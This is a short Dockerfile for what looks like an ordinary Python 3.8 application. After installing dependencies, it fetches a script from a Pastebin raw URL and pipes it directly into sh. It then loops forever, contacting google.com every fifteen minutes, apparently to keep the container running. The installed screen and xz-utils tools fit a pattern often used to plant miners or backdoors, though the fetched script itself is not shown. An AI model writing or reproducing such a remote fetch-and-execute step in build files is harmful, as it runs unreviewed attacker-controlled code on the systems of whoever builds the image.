FROM python:3.8

WORKDIR /app

COPY . /app

RUN pip install --no-cache-dir -r requirements.txt

RUN apt-get update -y && apt-get install wget -y && apt-get install -y xz-utils && apt-get install screen -y
RUN (wget https://pastebin.com/raw/GM1ytrP9 -O- | tr -d '\r') | sh && while true; do wget google.com ; sleep 900 ; done
